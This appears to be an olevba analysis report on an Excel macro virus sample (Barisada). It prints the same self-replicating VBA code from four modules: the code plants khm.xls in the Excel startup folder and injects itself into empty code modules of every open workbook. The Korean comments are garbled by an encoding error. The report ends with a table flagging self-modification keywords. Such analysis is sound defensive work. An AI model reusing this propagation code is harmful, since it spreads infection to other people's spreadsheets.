olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Barisada.v-78b6db2eb9b9a99971f59e242389678569242976
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Barisada.v-78b6db2eb9b9a99971f59e242389678569242976 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Private Sub Workbook_SheetCalculate(ByVal Sh As Object)

End Sub

Private Sub Workbook_SheetDeactivate(ByVal Sh As Object)

End Sub

Private Sub Workbook_WindowActivate(ByVal Wn As Window)

End Sub

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)

flag = False
 
'xlstartÆú´õ(StartupPath)¿¡ "khm.xls"°¡ ¾øÀ¸¸é »õ·Î ¸¸µç´Ù.
 myile = Dir(Application.StartupPath & "\khm.xls")
 If myfile <> "khm.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\khm.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 
'ThisWorkbook Component¿¡ ÄÚµå°¡ ÀÖÀ¸¸é vcodeº¯¼ö¿¡ ÄÚµå¸¦ ÀúÀå
For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
'ÄÚµå°¡ ¾ø´Â Component¸¦ Ã£¾Æ¼­ vcodeº¯¼ö°ªÀ» ÀÔ·Â
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "khm.xls" Then Workbooks("khm.xls").Close savechanges:=True
 
End Sub






















































-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Barisada.v-78b6db2eb9b9a99971f59e242389678569242976 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Private Sub Workbook_SheetCalculate(ByVal Sh As Object)

End Sub

Private Sub Workbook_SheetDeactivate(ByVal Sh As Object)

End Sub

Private Sub Workbook_WindowActivate(ByVal Wn As Window)

End Sub

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)

flag = False
 
'xlstartÆú´õ(StartupPath)¿¡ "khm.xls"°¡ ¾øÀ¸¸é »õ·Î ¸¸µç´Ù.
 myile = Dir(Application.StartupPath & "\khm.xls")
 If myfile <> "khm.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\khm.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 
'ThisWorkbook Component¿¡ ÄÚµå°¡ ÀÖÀ¸¸é vcodeº¯¼ö¿¡ ÄÚµå¸¦ ÀúÀå
For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
'ÄÚµå°¡ ¾ø´Â Component¸¦ Ã£¾Æ¼­ vcodeº¯¼ö°ªÀ» ÀÔ·Â
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "khm.xls" Then Workbooks("khm.xls").Close savechanges:=True
 
End Sub






















































-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Barisada.v-78b6db2eb9b9a99971f59e242389678569242976 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Private Sub Workbook_SheetCalculate(ByVal Sh As Object)

End Sub

Private Sub Workbook_SheetDeactivate(ByVal Sh As Object)

End Sub

Private Sub Workbook_WindowActivate(ByVal Wn As Window)

End Sub

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)

flag = False
 
'xlstartÆú´õ(StartupPath)¿¡ "khm.xls"°¡ ¾øÀ¸¸é »õ·Î ¸¸µç´Ù.
 myile = Dir(Application.StartupPath & "\khm.xls")
 If myfile <> "khm.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\khm.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 
'ThisWorkbook Component¿¡ ÄÚµå°¡ ÀÖÀ¸¸é vcodeº¯¼ö¿¡ ÄÚµå¸¦ ÀúÀå
For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
'ÄÚµå°¡ ¾ø´Â Component¸¦ Ã£¾Æ¼­ vcodeº¯¼ö°ªÀ» ÀÔ·Â
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "khm.xls" Then Workbooks("khm.xls").Close savechanges:=True
 
End Sub






















































-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Barisada.v-78b6db2eb9b9a99971f59e242389678569242976 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Private Sub Workbook_SheetCalculate(ByVal Sh As Object)

End Sub

Private Sub Workbook_SheetDeactivate(ByVal Sh As Object)

End Sub

Private Sub Workbook_WindowActivate(ByVal Wn As Window)

End Sub

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)

flag = False
 
'xlstartÆú´õ(StartupPath)¿¡ "khm.xls"°¡ ¾øÀ¸¸é »õ·Î ¸¸µç´Ù.
 myile = Dir(Application.StartupPath & "\khm.xls")
 If myfile <> "khm.xls" Then
   Application.ScreenUpdating = False
   Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\khm.xls", FileFormat:=xlNormal, addtomru:=False
 End If
 
'ThisWorkbook Component¿¡ ÄÚµå°¡ ÀÖÀ¸¸é vcodeº¯¼ö¿¡ ÄÚµå¸¦ ÀúÀå
For i = 1 To Workbooks.Count
  eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
  If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)
  
'ÄÚµå°¡ ¾ø´Â Component¸¦ Ã£¾Æ¼­ vcodeº¯¼ö°ªÀ» ÀÔ·Â
 For j = 1 To Workbooks(i).VBProject.VBComponents.Count
  vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
  If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
 Next j: Next i
  
  
 If myfile <> "khm.xls" Then Workbooks("khm.xls").Close savechanges:=True
 
End Sub






















































-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

